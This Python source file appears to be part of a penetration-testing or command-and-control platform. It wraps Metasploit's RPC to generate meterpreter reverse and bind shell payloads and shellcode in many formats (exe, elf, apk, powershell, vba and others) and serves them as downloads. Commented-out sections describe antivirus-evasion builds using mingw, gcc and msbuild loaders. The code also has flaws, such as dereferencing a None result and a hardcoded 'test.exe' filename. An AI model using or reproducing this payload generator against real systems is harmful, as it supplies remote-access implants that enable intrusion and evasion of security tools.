from utils.log import logger
from utils.msfmodule import MSFModule
from config.viper_config import RPC_FRAMEWORK_API_REQ
import base64
import time
from django.http import HttpResponse
from urllib import parse
import os


class Payload(object):
    def __init__(self):
        pass

    @staticmethod
    def create(mname=None, opts=None):
        """
        生成payload
        """
        if mname.find("reverse") > 0:
            if mname.find("reverse_dns") > 0:
                try:
                    opts.pop('LHOST')
                except Exception as _:
                    pass
            else:
                try:
                    opts.pop('RHOST')
                except Exception as _:
                    pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            opts['OverrideRequestHost'] = False

        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        # if opts.get("Format") == "AUTO":
        #     if "windows" in mname:
        #         opts["Format"] = 'exe-src'
        #     elif "linux" in mname:
        #         opts["Format"] = 'elf-src'
        #     elif "java" in mname:
        #         opts["Format"] = 'jar'
        #     elif "python" in mname:
        #         opts["Format"] = 'py'
        #     elif "php" in mname:
        #         opts["Format"] = 'raw'
        #     elif "android" in mname:
        #         opts["Format"] = 'raw'
        #     else:
        #         logger.info("格式错误")
                # context = data_return(306, {}, Payload_MSG_ZH.get(306), Payload_MSG_EN.get(306))
                # return context

        # if opts.get("Format") in ["exe-diy", "dll-diy", "dll-mutex-diy", "elf-diy"]:
        #     # 生成原始payload
        #     tmp_type = opts.get("Format")
        #     opts["Format"] = "hex"
        #     result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                timeout=RPC_FRAMEWORK_API_REQ)
        #     if result is None:
        #         logger.info("请求MSF出错")
        #         # context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #         # return context
        #
        #     byteresult = base64.b64decode(result.get('payload'))
        #     filename = Payload._create_payload_with_loader(mname, byteresult, payload_type=tmp_type)
        #     # 读取新的zip文件内容
        #     payloadfile = os.path.join(File.tmp_dir(), filename)
        #     if opts.get("HandlerName") is not None:
        #         filename = f"{opts.get('HandlerName')}_{filename}"
        #     byteresult = open(payloadfile, 'rb')
        # elif opts.get("Format") == "msbuild":
        #     # 生成原始payload
        #     opts["Format"] = "csharp"
        #     result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                timeout=RPC_FRAMEWORK_API_REQ)
        #     if result is None:
        #         context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #         return context
        #     byteresult = base64.b64decode(result.get('payload'))
        #     filename = Payload._create_payload_use_msbuild(mname, byteresult)
        #     # 读取新的zip文件内容
        #     payloadfile = os.path.join(File.tmp_dir(), filename)
        #     byteresult = open(payloadfile, 'rb')
        # elif opts.get("Format") == "exe-src":
        #     if mname in ['windows/meterpreter_bind_tcp',
        #                  'windows/meterpreter_reverse_tcp',
        #                  'windows/meterpreter_reverse_http',
        #                  'windows/meterpreter_reverse_https',
        #                  'windows/meterpreter_reverse_dns',
        #                  'windows/x64/meterpreter_bind_tcp',
        #                  'windows/x64/meterpreter_reverse_tcp',
        #                  'windows/x64/meterpreter_reverse_http',
        #                  'windows/x64/meterpreter_reverse_https',
        #                  'windows/x64/meterpreter_reverse_dns']:
        #         opts["Format"] = "exe"
        #         result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                    timeout=RPC_FRAMEWORK_API_REQ)
        #         if result is None:
        #             context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #             return context
        #         byteresult = base64.b64decode(result.get('payload'))
        #         filename = f"{int(time.time())}.exe"
        #     else:
        #         opts["Format"] = "hex"
        #         result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                    timeout=RPC_FRAMEWORK_API_REQ)
        #         if result is None:
        #             context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #             return context
        #         byteresult = base64.b64decode(result.get('payload'))
        #         byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
        #                                                       template="REVERSE_HEX_BASE")
        #         filename = f"{int(time.time())}.exe"
        # elif opts.get("Format") == "exe-src-service":
        #     opts["Format"] = "hex"
        #     result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                timeout=RPC_FRAMEWORK_API_REQ)
        #     if result is None:
        #         context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #         return context
        #     byteresult = base64.b64decode(result.get('payload'))  # result为None会抛异常
        #     byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
        #                                                   template="REVERSE_HEX_AS_SERVICE")
        #     filename = f"{int(time.time())}.exe"
        # # linux类型免杀
        # elif opts.get("Format") == "elf-src":
        #     if mname in ['linux/x86/meterpreter/reverse_tcp', 'linux/x86/meterpreter/bind_tcp',
        #                  'linux/x64/meterpreter/reverse_tcp', 'linux/x64/meterpreter/bind_tcp', ]:
        #         opts["Format"] = "hex"
        #         result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                    timeout=RPC_FRAMEWORK_API_REQ)
        #         if result is None:
        #             context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #             return context
        #         byteresult = base64.b64decode(result.get('payload'))
        #         byteresult = Payload._create_payload_by_gcc(mname=mname, shellcode=byteresult)
        #         filename = f"{int(time.time())}.elf"
        #     else:
        #         opts["Format"] = "elf"
        #         result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
        #                                                    timeout=RPC_FRAMEWORK_API_REQ)
        #         if result is None:
        #             context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
        #             return context
        #         byteresult = base64.b64decode(result.get('payload'))
        #         filename = f"{int(time.time())}.elf"
        file_suffix = {
            "asp": "asp",
            "aspx": "aspx",
            "aspx-exe": "aspx",
            'base32': "base32",
            'base64': "base64",
            'bash': "sh",
            'c': "c",
            'csharp': "cs",
            "dll": "dll",
            'dword': "dword",
            "elf": "elf",
            "elf-so": "so",
            "exe": "exe",
            "exe-only": "exe",
            "exe-service": "exe",
            "exe-small": "exe",
            'hex': "hex",
            "hta-psh": "hta",
            "jar": "jar",
            'java': "java",
            "jsp": "jsp",
            'js_be': "js",
            'js_le': "js",
            "macho": "macho",
            "msi": "msi",
            "msi-nouac": "msi",
            'powershell': "ps1",
            "psh": "ps1",
            "psh-cmd": "psh-cmd",
            "psh-net": "psh-net",
            "psh-reflection": "psh-reflection",
            'python': "py",
            "python-reflection": "python-reflection",
            'perl': "pl",
            'raw': "raw",
            'ruby': "rb",
            'vbapplication': "vba",
            "vba": "vba",
            "vba-exe": "vba",
            "vba-psh": "vba",
            "vbs": "vbs",
            'vbscript': "vbscript",
            "loop-vbs": "vbs",
            "war": "war",
        }
        result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                       timeout=RPC_FRAMEWORK_API_REQ)
        # logger.info("msf返回数据: {}".format(result))
        if result is None:
            # context = data_return(305, {}, Payload_MSG_ZH.get(305), Payload_MSG_EN.get(305))
            # return context
            logger.info("请求MSF无返回数据")
        byteresult = base64.b64decode(result.get('payload'))
        if "android" in mname:
            filename = f"{int(time.time())}.apk"
        elif file_suffix.get(opts.get("Format")) is None:
            filename = f"{int(time.time())}"
        else:
            filename = f"{int(time.time())}.{file_suffix.get(opts.get('Format'))}"

        # 将msf返回的payload生成exe供浏览器下载
        response = HttpResponse(byteresult)
        response['Content-Type'] = 'application/octet-stream'
        response['Code'] = 200
        # response['Msg_zh'] = parse.quote(Payload_MSG_ZH.get(201))
        # response['Msg_en'] = parse.quote(Payload_MSG_EN.get(201))
        # 中文特殊处理
        urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
        leftpart = os.path.splitext(filename)[-1]
        print(urlpart, leftpart)
        # response['Content-Disposition'] = f"{urlpart}{leftpart}"
        response["Content-Disposition"] = 'attachment;filename=test.exe'
        return response

    @staticmethod
    def generate_shellcode(mname=None, opts=None):
        # mname = windows/x64/meterpreter/reverse_tcp
        # 正向或反向连接
        if mname.find("reverse") > 0:
            try:
                opts.pop('RHOST')
            except Exception as _:
                pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            opts['OverrideRequestHost'] = False

        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        opts["Format"] = 'raw'
        if "windows" in mname:
            opts["Format"] = 'raw'
        elif "linux" in mname:
            opts["Format"] = 'raw'
        elif "java" in mname:
            opts["Format"] = 'jar'
        elif "python" in mname:
            opts["Format"] = 'py'
        elif "php" in mname:
            opts["Format"] = 'raw'

        result = MSFModule.run_msf_module_realtime(module_type="payload", mname=mname, opts=opts,
                                                   timeout=RPC_FRAMEWORK_API_REQ)
        if result is None:
            return result
        byteresult = base64.b64decode(result.get('payload'))
        return byteresult
